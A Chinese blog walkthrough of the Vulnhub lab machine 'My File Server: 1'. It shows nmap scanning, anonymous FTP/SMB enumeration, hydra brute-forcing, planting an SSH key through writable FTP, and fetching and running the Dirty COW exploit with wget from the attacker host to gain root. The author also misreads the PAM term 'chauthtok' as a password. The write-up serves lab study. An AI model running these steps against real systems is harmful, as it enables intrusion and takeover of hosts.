[Vulnhub靶机渗透：MY FILE SERVER: 1_TryHardToKeep的博客-CSDN博客](https://blog.csdn.net/Mysmycbx/article/details/131153003)

# 端口探测

```bash
nmap -sn -n --min-rate 1000 192.168.10.0/24
ip=192.168.10.16
ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
nmap -p$ports -sV -sC -O $ip -oN nmap.txt
nmap --script=vuln -p$ports -oN vuln.txt $ip
```

```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    3 0        0              16 Feb 19  2020 pub [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.10.17
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 75fa37d1624a15877e2183b92fff0493 (RSA)
|   256 b8db2ccae270c3eb9aa8cc0ea21c686b (ECDSA)
|_  256 66a31b55cac2518441217f774045d49f (ED25519)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS))
|_http-title: My File Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS)
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100003  3,4         2049/udp   nfs
|   100003  3,4         2049/udp6  nfs
|   100005  1,2,3      20048/tcp   mountd
|   100005  1,2,3      20048/tcp6  mountd
|   100005  1,2,3      20048/udp   mountd
|   100005  1,2,3      20048/udp6  mountd
|   100021  1,3,4      41801/tcp   nlockmgr
|   100021  1,3,4      45522/tcp6  nlockmgr
|   100021  1,3,4      51674/udp6  nlockmgr
|   100021  1,3,4      58111/udp   nlockmgr
|   100024  1          36336/tcp6  status
|   100024  1          41808/tcp   status
|   100024  1          52666/udp   status
|   100024  1          60611/udp6  status
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
445/tcp   open  netbios-ssn Samba smbd 4.9.1 (workgroup: SAMBA)
2049/tcp  open  nfs_acl     3 (RPC #100227)
2121/tcp  open  ftp         ProFTPD 1.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
20048/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:63:6A:B9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13, Linux 3.10, Linux 3.4 - 3.10
Network Distance: 1 hop
Service Info: Host: FILESERVER; OS: Unix

Host script results:
|_clock-skew: mean: 6h10m00s, deviation: 3h10m30s, median: 7h59m58s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-08-21T14:49:57
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.1)
|   Computer name: localhost
|   NetBIOS computer name: FILESERVER\x00
|   Domain name: \x00
|   FQDN: localhost
|_  System time: 2023-08-21T20:19:55+05:30
```

选择渗透方向，观察服务，发现：

- 21端口，ftp服务，可以匿名登录，可写。
- 22端口，openssh服务。
- 80端口，apache服务。操作系统centos。
- 111端口，rpc服务。
- 445端口，samba服务，tcp协议。
- 2049端口，nfs服务，和111端口上的细节可以呼应上。
- 2121端口，ftp服务，可以匿名登录。
- 20048端口，可以挂载nfs服务，与111端口相呼应。
- 总结一下：21, samba,nfs, 80....

# 21/2121 ftp

## ftp匿名登录

`anonymous` 匿名登录 21 端口的 ftp，发现无法下载文件

```bash
└─# ftp 192.168.10.16
Connected to 192.168.10.16.
220 (vsFTPd 3.0.2)
Name (192.168.10.16:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||5924|).
150 Here comes the directory listing.
drwxrwxrwx    3 0        0              16 Feb 19  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||5105|).
150 Here comes the directory listing.
drwxr-xr-x    9 0        0            4096 Feb 19  2020 log
226 Directory send OK.
ftp> pwd
Remote directory: /pub
ftp> ls
229 Entering Extended Passive Mode (|||5759|).
150 Here comes the directory listing.
drwxr-xr-x    9 0        0            4096 Feb 19  2020 log
226 Directory send OK.
ftp> cd log
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||5630|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Feb 19  2020 anaconda
drwxr-x---    2 0        0              22 Feb 19  2020 audit
-rw-r--r--    1 0        0            7033 Feb 19  2020 boot.log
-rw-------    1 0        0           10752 Feb 19  2020 btmp
-rw-r--r--    1 0        0            9161 Feb 19  2020 cron
-rw-r--r--    1 0        0           31971 Feb 19  2020 dmesg
-rw-r--r--    1 0        0           31971 Feb 19  2020 dmesg.old
drwxr-xr-x    2 0        0               6 Feb 19  2020 glusterfs
drwx------    2 0        0              39 Feb 19  2020 httpd
-rw-r--r--    1 0        0          292584 Feb 19  2020 lastlog
-rw-------    1 0        0            3764 Feb 19  2020 maillog
-rw-------    1 0        0         1423423 Feb 19  2020 messages
drwx------    2 0        0               6 Feb 19  2020 ppp
drwx------    4 0        0              43 Feb 19  2020 samba
-rw-------    1 0        0           63142 Feb 19  2020 secure
-rw-------    1 0        0               0 Feb 19  2020 spooler
-rw-------    1 0        0               0 Feb 19  2020 tallylog
drwxr-xr-x    2 0        0              22 Feb 19  2020 tuned
-rw-r--r--    1 0        0           58752 Feb 19  2020 wtmp
-rw-------    1 0        0             100 Feb 19  2020 xferlog
-rw-------    1 0        0           18076 Feb 19  2020 yum.log
226 Directory send OK.
ftp> get secure
local: secure remote: secure
229 Entering Extended Passive Mode (|||5166|).
550 Failed to open file.
```

换个 2121 端口 的 ftp 显示一样无法下载文件

# 445 samba

`smbmap` 工具枚举目录

```bash
└─# smbmap -H 192.168.10.16 
[+] IP: 192.168.10.16:445	Name: 192.168.10.16                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	smbdata                                           	READ, WRITE	smbdata
	smbuser                                           	NO ACCESS	smbuser
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.9.1)
```

`smbclient`  工具登录 smb，匿名登录

```bash
└─# smbclient //192.168.10.16/smbdata
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Aug 21 10:59:00 2023
  ..                                  D        0  Tue Feb 18 06:47:54 2020
  anaconda                            D        0  Tue Feb 18 06:48:15 2020
  audit                               D        0  Tue Feb 18 06:48:15 2020
  boot.log                            N     6120  Tue Feb 18 06:48:16 2020
  btmp                                N      384  Tue Feb 18 06:48:16 2020
  cron                                N     4813  Tue Feb 18 06:48:16 2020
  dmesg                               N    31389  Tue Feb 18 06:48:16 2020
  dmesg.old                           N    31389  Tue Feb 18 06:48:16 2020
  glusterfs                           D        0  Tue Feb 18 06:48:16 2020
  lastlog                             N   292292  Tue Feb 18 06:48:16 2020
  maillog                             N     1982  Tue Feb 18 06:48:16 2020
  messages                            N   684379  Tue Feb 18 06:48:17 2020
  ppp                                 D        0  Tue Feb 18 06:48:17 2020
  samba                               D        0  Tue Feb 18 06:48:17 2020
  secure                              N    11937  Tue Feb 18 06:48:17 2020
  spooler                             N        0  Tue Feb 18 06:48:17 2020
  tallylog                            N        0  Tue Feb 18 06:48:17 2020
  tuned                               D        0  Tue Feb 18 06:48:17 2020
  wtmp                                N    25728  Tue Feb 18 06:48:17 2020
  xferlog                             N      100  Tue Feb 18 06:48:17 2020
  yum.log                             N    10915  Tue Feb 18 06:48:17 2020
  sshd_config                         N     3906  Wed Feb 19 02:46:38 2020

		19976192 blocks of size 1024. 18285480 blocks available
```

先下载两个重要文件

```bash
smb: \> pwd
Current directory is \\192.168.10.16\smbdata\
smb: \> get secure
getting file \secure of size 11937 as secure (2331.4 KiloBytes/sec) (average 2331.4 KiloBytes/sec)
smb: \> get sshd_config
getting file \sshd_config of size 3906 as sshd_config (1271.4 KiloBytes/sec) (average 1934.0 KiloBytes/sec)
smb: \> exit
```

本地查看 `secure` 文件

```bash
Feb 18 17:16:39 localhost useradd[2389]: new user: name=smbuser, UID=1000, GID=1000, home=/home/smbuser, shell=/bin/bash
Feb 18 17:17:09 localhost passwd: pam_unix(passwd:chauthtok): password changed for smbuser
```

得到一个账号密码 `smbuser:chauthtok`，留心并写入凭据文件，这里尝试一下密码碰撞，登录21端口ftp，失败。 2121端口，ftp失败，22端口欧ssh，失败。

```bash
 echo 'smbuser:chauthtok' >> cred.txt
```

通本地查看 `sshd_config` 文件

<img src=".\图片\Snipaste_2023-08-21_15-08-15.png" alt="Snipaste_2023-08-21_15-08-15" style="zoom:80%;" />

目前只能密钥登录，所以ssh使用密码登录已经不可能了

# 2049/20048 nfs

```
$ showmount -e 192.168.10.16       
Export list for 192.168.10.16
/smbdata 192.168.56.0/24
```

这里显示存在 smbdata，但是需要在 56 网段才可以访问，目前的环境是 10，就先不麻烦修改了，先尝试其他思路，如果实在没有突破口了，就回到这里继续。

# 80 http

<img src=".\图片\Snipaste_2023-08-21_15-10-33.png" alt="Snipaste_2023-08-21_15-10-33" style="zoom:80%;" />

打开网页，并目录爆破

```bash
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x zip,html,rar,txt,sql,jsp,php --url http://192.168.10.16/ --no-error
```

得到 `readme.txt`

```bah
/readme.txt           (Status: 200) [Size: 25]
```

得到一个密码信息， `rootroot1`

<img src=".\图片\Snipaste_2023-08-21_15-13-22.png" alt="Snipaste_2023-08-21_15-13-22" style="zoom:80%;" />

# ftp 上传 ssh 公钥

紧接上文，得到了一些账号密码，把它们做成字典

```bash
└─# cat user.list  
smbuser
smbdata
└─# cat pass.list         
chauthtok
rootroot1
```

可以爆破一下 ftp 

```bash
└─# hydra -L user.list -P pass.list ftp://192.168.10.16
[21][ftp] host: 192.168.10.16   login: smbuser   password: rootroot1
```

 得到 账号密码 `smbuser:rootroot1`，于是再次登录 ftp

```bash
└─# ftp 192.168.10.16
Connected to 192.168.10.16.
220 (vsFTPd 3.0.2)
Name (192.168.10.16:root): smbuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> pwd
Remote directory: /home/smbuser
ftp>  ls
229 Entering Extended Passive Mode (|||5929|).
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -al
229 Entering Extended Passive Mode (|||5959|).
150 Here comes the directory listing.
drwx------    2 1000     1000           79 Feb 18  2020 .
drwxr-xr-x    3 0        0              20 Feb 19  2020 ..
-rw-------    1 1000     1000           27 Feb 20  2020 .bash_history
-rw-r--r--    1 1000     1000           18 Mar 05  2015 .bash_logout
-rw-r--r--    1 1000     1000          193 Mar 05  2015 .bash_profile
-rw-r--r--    1 1000     1000          231 Mar 05  2015 .bashrc
226 Directory send OK.
```

这是 `smbuser` 账号的家目录，于是想到了生成 ssh 公私钥，上传公钥到 `.ssh`  目录下便可登录了

 kali 本地 生成 公私钥：

```bash
└─# ssh-keygen
Generating public/private rsa key pair.

Enter file in which to save the key (/root/.ssh/id_rsa): Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:9Od/RDZkpuC/Z/mnmYKWT3d/ml133ztpnglAwDxMQ2g root@kali
The key's randomart image is:
+---[RSA 3072]----+
|        B=       |
|       E =o.   + |
|      . . o.. =  |
|       . ... . .o|
|        S ..o  o.|
|           o..  .|
|           oo.o.B|
|          +..+.&&|
|         . ...%O%|
+----[SHA256]-----+
                                                                                                                                                                 
┌──(root💀kali)-[~/MyFileServer]
└─# ls
cred.txt  nmap.txt  pass.list  secure  sshd_config  user.list
                                                                                                                                                                 
┌──(root💀kali)-[~/MyFileServer]
└─# cp /root/.ssh/id_rsa.pub authorized_keys
                                                                                                                                                                 
┌──(root💀kali)-[~/MyFileServer]
└─# cp /root/.ssh/id_rsa  id_rsa            
```

把 `authorized_keys` ftp 上传到 `/home/smbuser/.ssh` 目录下：

```bash
ftp> mkdir .ssh
257 "/home/smbuser/.ssh" created
ftp> cd .ssh
250 Directory successfully changed.
ftp> put authorized_keys
local: authorized_keys remote: authorized_keys
229 Entering Extended Passive Mode (|||5850|).
150 Ok to send data.
100% |********************************************************************************************************************|   563        7.35 MiB/s    00:00 ETA
226 Transfer complete.
563 bytes sent in 00:00 (617.75 KiB/s)
```

kali 指定 私钥 ssh 登录：

```bash
└─# ssh -i id_rsa smbuser@192.168.10.16 
[smbuser@fileserver ~]$ uname -a
Linux fileserver 3.10.0-229.el7.x86_64 #1 SMP Fri Mar 6 11:36:42 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
```

# 内核提权

这里操作前说一下，内核漏洞提权虽然操作简单，就是上传脚本编译运行。但是如何找到正确可利用的脚本的这个过程，也是个麻烦事儿，可能凭经验，linux 下经典的脏牛。还可以上一些 `linpeas.sh` 等脚本在目标机上运行，配合 `searchsploit` 查找。利用失败的话就是一个个的试，这个**寻找利用的过程**也有一部分运气成分

于是这里猜测一用脏牛尝试

```bash
└─# searchsploit dirty cow
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                                                         | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                                                         | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)             | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                                   | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)             | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                                    | linux/local/40611.c
------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
└─# searchsploit dirty cow -m 40847
```

上传到靶机然后编译运行

```bash
[smbuser@fileserver tmp]$ wget http://192.168.10.17:8088/40847.cpp
```

查看编译参数：

```bash
┌──(root💀kali)-[~/MyFileServer]
└─# head 40847.cpp                                     
// EDB-Note: Compile:   g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
// EDB-Note: Recommended way to run:   ./dcow -s    (Will automatically do "echo 0 > /proc/sys/vm/dirty_writeback_centisecs")
//
// -----------------------------------------------------------------
// Copyright (C) 2016  Gabriele Bonacini
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation; either version 3 of the License, or
// (at your option) any later version.
```

编译运行：

```bash
[smbuser@fileserver tmp]$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
[smbuser@fileserver tmp]$ ls
40847.cpp  dcow  systemd-private-463e93549cfb43ea88c00391de2916a0-httpd.service-mlO4H4
[smbuser@fileserver tmp]$ chmod +x dcow 
[smbuser@fileserver tmp]$ ./dcow 
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
```

这里是修改了 root 的密码 ，为 `dirtyCowFun`

`su root` 便提权成功

```bash
[smbuser@fileserver tmp]$ su root
Password: 
[root@fileserver tmp]# id
uid=0(root) gid=0(root) groups=0(root)
[root@fileserver tmp]# cd /root
[root@fileserver ~]# ls
proof.txt
[root@fileserver ~]# cat proof.txt 
Best of Luck
af52e0163b03cbf7c6dd146351594a43
```

# 总结

- 对于 smb 服务，有 `smbmap` 、`smbclient` 工具

- ftp 目录 在 `home/user` 下又可以上传文件时，可以尝试上传公钥 到`.ssh/authorized_keys` ，并私钥登录

- 渗透过程中留心收集 账号密码 并做成字典，好爆破 ftp 、ssh、web登录、mysql等等
